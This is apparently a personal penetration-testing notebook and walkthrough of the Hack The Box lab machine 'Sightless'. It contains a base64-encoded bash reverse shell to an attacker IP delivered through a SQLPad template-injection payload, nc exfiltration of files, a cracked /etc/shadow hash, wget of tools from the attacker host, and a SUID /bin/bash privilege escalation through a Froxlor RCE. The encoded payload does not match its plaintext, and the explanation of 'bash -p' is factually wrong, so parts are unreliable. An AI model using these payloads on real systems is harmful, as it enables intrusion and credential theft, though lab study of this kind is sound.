# Miscellaneous 4

Note: this is just a simple list of useful commands and techniques in order to optimize my learning and day-to-day operations. Also, I am reminiscing on what I have learned from the HTB box called "Sightless".


## A bit more on cracking hashes

For example:

```
hashcat -a0 -m1700 hash.txt /usr/share/wordlists/rockyou.txt
```

Notes: ```-a 0``` is for a straight attack, meaning Hashcat will attempt to crack the hash by trying each word from a wordlist directly against the hash. ```-m 1700``` specifies the hash type. 1700 corresponds to SHA2-512 hashes. So Hashcat will know how to treat the hash we're cracking as a SHA-512 hash. As always, ```hash-identifier``` tool is perfect for identifying unknown hash formats.

To see what hash options we need to use with ```hashcat```, we could use the following command:

```
hashcat --help | grep <hash type>
```

**Also, John works much better in my experience. For example:**

```
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

## Making a reverse shell more stable

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

This is super useful for upgrading a basic reverse shell (like one from a PHP reverse shell) to a more stable and interactive one. After running this, it’s often good to resize the shell properly by using:

```
Ctrl + Z
stty raw -echo; fg
reset
```

## Sending files from a reverse shell

First, we need to set up a separate listener:

```
ncat -l -p 9000 > received_file.pdf
```

So, when a file is sent to your machine on port 9000, it will be saved with the name received_file.pdf in your current directory. It’s a simple and effective way to receive files over the network.

And sending a file from our reverse shell can be done like this:

```
nc -q 0 10.10.14.5 9000 < 'Using OpenVAS.pdf'
```

Note: we use the flag ```-q 0``` to close the connection automatically once the file transfer is complete.

## Dealing with blurred text (passwords) in PDF documents

First, we need the following tool:

```
sudo apt-get install poppler-utils
```

Now we are ready to extract the blurred text:

```
pdfimages file.pdf pass.png
```

We extracted the image successfully but it’s ```.ppm``` (in spite of the earlier command) so we to need to convert it to ```.png``` using a tool called pnmtopng.

```
sudo apt install netpbm
```

The next step:

```
pnmtopng pass.png-000.ppm > password.png
```

To inspect the file we just got, we could use this command:

```
file password.png
```

And the output may look like this:

```
password.png: PNG image data, 420 x 15, 8-bit colormap, non-interlaced
```

Another thing to note, that the Depix tool (used in the next step) needs the image to be in RGB mode. With the help of this simple Python script we can do just that:

```
from PIL import Image

# Load the image
image = Image.open("password.png")

# Convert the image to RGB mode
rgb_image = image.convert("RGB")

# Save the new image
rgb_image.save("rgb_password.png")

print("Image converted to RGB mode and saved successfully.")
```

We can save this as convert.py script that will transform the image into RGB mode. We can execute it with ```python3 convert.py``` command.

Depix tool usage:

We will probably need to install it first. Depix requires Python and some Python libraries. We can install the required libraries with:

```
pip install opencv-python numpy pillow
```

Next, we clone it using git:

```
git clone https://github.com/beurtschipper/Depix.git
```

Navigate to the Directory:

```
cd Depix
```

And executing the tool goes like this:

```
python depix.py -p rgb_password.png -s images/searchimages/debruinseq_notepad_Windows10_closeAndSpaced.png -o output.png
```

Note: the parameter ```-s images/searchimages/debruinseq_notepad_Windows10_closeAndSpaced.png``` should always be the same.

## Encoding payloads is often the key (Sightless retrospective)

While tackling the infamous 'Sightless' HTB box, I encountered a vulnerable SQLPad 6.10.0 service, which was supposed to provide initial foothold through a template injection vulnerability. Initially, I tried a straightforward payload, but it failed, suggesting that some form of input sanitization might be in place. As it turns out, my assumption was spot on and this is how I tackled this issue.

First, I needed to apply base64 encoding like this:

```
echo 'sh -i >& /dev/tcp/10.10.14.5/4444 0>&1' | base64
```

After that I was ready to inject it:

```
{{ process.mainModule.require('child_process').exec('echo c2ggLWkgPiYgL2Rldi90Y3FvMTAuMTAuMTQuNS80NDQ0IDA+JjEK | base64 -d | bash') }}
```

This worked beautifully and I got a shell.

## Enumeration works well with ssh tunneling

Once I gained a shell, the unusual hostname raised some suspicions. A quick ```ls -la /``` command confirmed it — I was inside a Docker container, running as root.

The next step was looking at the home directory: ```ls -la /home```. This revealed an interesting user named "michael". Since I was root, looking at ```/etc/shadow``` has enabled me to take michael's hash and crack it with ```John```.

Note: I saved both the username and hash into a text file, which looked like this:

```
michael:$6$mG3Cp2VPGY.FDE8u$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa.q2Z9bLUU6tlBWaEwuxCDEP9UFHIXNUcF2rBnsaFYuJa6DUh/pL2IJD/
```

The key takeaway: it’s easy to forget that the hash only goes up to the first colon. Running ```John``` was quite easy using this setup and I have received my credentials allowing me to ssh into the box and retrieve the user flag.

Unfortunately, the rest of enumeration routine (sudo permissions, SUID, cron jobs...) didn't do me much good.

Note: the following commands can be used to view cron jobs:

- For user-specific cron jobs: ```crontab -l```

- For system-wide cron jobs: ```cat /etc/crontab```

- To see all running cron jobs on the system: ```systemctl list-timers --all```

Anyway, the next step was looking at the open ports:

```
ss -tlnp
```

Notes:

- ```-t```: Show only TCP sockets.

- ```-l```: Show only listening sockets (i.e., services that are waiting for incoming connections).

- ```-n```: Don't resolve names (this displays the ports as numbers instead of trying to convert them into service names).

- ```-p```: Show the process using each socket (helps identify which service or application is tied to a port).

The output revealed internal open port at 8080, so the next logical step was ssh tunneling (also known as port forwarding) so I could interact with that service.

```
ssh -L 8080:127.0.0.1:8080 michael@sightless.htb -N -f
```

- ```-N```: This flag tells SSH not to execute any remote commands. It's useful when you only want to set up the port forwarding (tunneling) and not open an interactive shell or run any commands on the remote machine.

- ```-f```: This flag tells SSH to go to the background just before executing the command. This is useful for creating background tunnels without keeping the SSH session open in the foreground.

Note: closing the terminal won’t automatically terminate the background SSH tunnel. You'll need to manually stop it.

You can do this by finding and killing the SSH process associated with the tunnel. Here’s how:

- Find the Process ID (PID): Run ```ps aux | grep ssh``` to locate the PID of the SSH process that set up the tunnel. Look for the command with the ```-L``` option.

- Kill the Process: Use ```kill <PID>``` to terminate the process. If you’re unsure which one to kill, you can use ```killall ssh``` to terminate all SSH processes, but be cautious if you have other SSH sessions running.

After that I was ready to visit ```http://127.0.0.1:8080/``` and see a Froxlor login page.

At first, I wasn’t sure how to approach the Froxlor login page since none of the default credentials worked, and it didn’t seem vulnerable to typical attack vectors. This was the point where I had to dig deeper and explore other solutions. My first step was hosting the ```pspy64``` utility on my machine and fetching it on the target using the ```wget``` command.

```
wget http://10.10.14.5:8000/pspy64
```

Also:

```
chmod +x pspy64
```

Running the ```pspy64``` utility revealed that Chrome debugging might be active on the machine, which seemed a bit unusual. In the end, I set up an SSH tunnel for all the high ports and started digging deeper. The first step was opening Chromium on my Kali machine and navigating to ```chrome://inspect/#devices```. From there, I had to input all the ports I had forwarded earlier. [This article](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/chrome-remote-debugger-pentesting/) has helped me a lot.

Clicking 'Inspect' (on the same screen where I added the ports) finally allowed me to retrieve the credentials. In the window that opened, I navigated to the 'Network' tab, then set the smaller sub-section to the 'Payload' tab. From there, I examined the POST request to ```/index.php.```

## Web Panels, SUID permission on the ```/bin/bash```, Bash -p for Privilege Escalation etc.

After logging into the Froxlor dashboard it was time to look around and try out some privilege escalation tricks.

While exploring, I discovered a potential Remote Code Execution (RCE) vulnerability in the PHP-FPM Versions section. I found that under PHP settings, I could create a new PHP version, and the RCE was triggered through the ```PHP-FPM restart command``` input field.

To escalate privileges, I opted to set the SUID permission on the ```/bin/bash binary```.

```
chmod 4777 /bin/bash
```

By issuing the ```chmod 4777 /bin/bash``` command through the PHP-FPM restart input field, I set the SUID bit on the ```/bin/bash``` binary. This made the bash executable run with root privileges regardless of the user executing it. Consequently, when I accessed bash via SSH, I had root access, allowing me to fully control the system.

After entering the command and clicking 'Save,' I needed to restart PHP-FPM for the changes to take effect. This could be done under System > Settings. I toggled the switch off, saved the changes, and then turned it back on, which successfully executed the command.

The next step was to verify the change by running ls -la /bin/bash in my SSH session, which revealed the following output:

```
-rwsrwxrwx 1 root root 1396520 Mar 14 11:31 /bin/bash
```

After that I issued this command:

```
/bin/bash -p
```

Issuing ```/bin/bash -p``` was a critical (and final) step in the privilege escalation process. The ```-p``` flag instructs ```bash``` to preserve the environment variables of the calling process. This preservation of environment variables is crucial because it can help bypass certain restrictions that might be imposed by the SUID (Set User ID) permission changes on the ```bash``` binary.

Here’s a more detailed breakdown of why this works:

1. Preservation of Environment Variables: When you run ```/bin/bash``` with the ```-p``` flag, bash retains the environment variables from the calling process. This includes variables like ```PATH```, ```HOME```, and any other environment settings that may influence how ```bash``` operates.

2. Bypassing Restrictions: Without the ```-p``` flag, the default behavior of ```bash``` when executed with SUID permissions might include additional restrictions or sandboxing that limit its functionality. For instance, the shell might drop certain privileges or apply additional security measures to prevent unauthorized access. By preserving the environment, ```bash``` can bypass these restrictions because it operates with the same environmental context as before the privilege escalation attempt.

3. Elevating Privileges: The ```-p``` flag effectively prevents ```bash``` from resetting or stripping out certain environment variables that might be necessary for maintaining elevated privileges. As a result, when the SUID ```bash``` binary is executed with the ```-p``` flag, it can elevate from user-level to root-level access as intended, without being hindered by the additional security mechanisms that would normally apply.

Closing Note: during the privilege escalation process, I initially encountered an unexpected issue where issuing ```/bin/bash -p``` still resulted in a user-level shell instead of root. This discrepancy could be attributed to the PHP-FPM restart not taking effect immediately. It seems that there was a delay in the SUID permission changes being fully applied to the ```/bin/bash``` binary.

To address this, I terminated the current SSH session and started a new one. Upon reissuing the ```/bin/bash -p``` command in the new session, I was able to successfully obtain root privileges. This delay highlights the importance of ensuring that all service restarts and permission changes are fully propagated before testing for privilege escalation.

In summary, if changes do not seem to take effect immediately, it may be beneficial to restart your session or verify that all services are properly refreshed to reflect the new configurations.
